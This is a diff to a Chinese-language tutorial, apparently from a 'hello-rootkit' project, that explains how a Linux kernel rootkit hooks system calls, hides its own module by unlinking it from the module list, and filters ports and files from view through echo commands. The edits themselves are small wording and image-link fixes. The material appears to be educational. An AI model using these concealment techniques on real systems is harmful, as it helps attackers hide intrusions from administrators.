@@ -73,7 +73,7 @@ module_exit(example_exit);
 
 ## hook系统调用
 
-进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用`man -k syscall`获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能
+用户进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用`man -k syscall`获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能
 
 ![hook](https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/hook.png)
 
@@ -248,11 +248,11 @@ struct module {
 }
 ```
 
-为了隐藏模块，我们只需把对应模块的list从全局链表中删除即可。内核已经替我们实现了list_del和list_add函数，它们被封装在list.h头文件中，我们调用即可。在下面的代码中，THIS_MODULE宏指向当前模块的module struct
+为了隐藏模块，我们只需把对应rootkit模块的list从全局链表中删除即可。内核已经替我们实现了list_del和list_add函数，它们被封装在list.h头文件中，我们调用即可。在下面的代码中，THIS_MODULE宏指向当前模块的module struct
 
 值得注意的是，为了恢复节点，我们需要临时保存节点的信息
 
-```
+```c
 static void hide_myself(void) {  list_del(&THIS_MODULE->list);  }
 
 static void show_myself(void) {  list_add(&THIS_MODULE->list, module_prev); }
@@ -565,7 +565,7 @@ show函数会将需要展示的端口信息放在seq->buf中，而seq->count记�
         if (type == node->type){
             // seq->buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf
             snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
-            // 之后将缓冲区的新增字符串和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
+            // 之后将缓冲区的新增字符串和port_str_buf进行对比判断是否要过滤端口
             if (strnstr(seq->buf + last_len, port_str_buf, this_len)){
                 pr_info("Hiding port: %d", node->port);
                 seq->count = last_len;
@@ -624,7 +624,7 @@ echo hidefile [filename] >/dev/null
 echo showfile [filename] >/dev/null
 ```
 
-![]()
+![](https://github.com/LaPhilosophie/hello-rootkit/blob/main/image/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F&%E6%81%A2%E5%A4%8D.png?raw=true)
 
 端口隐藏与恢复
 
@@ -633,7 +633,7 @@ echo hideport [port] >/dev/null
 echo showport [port] >/dev/null
 ```
 
-![](https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png)
+![](https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E7%AB%AF%E5%8F%A3%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png)
 
 # 参考资料
 
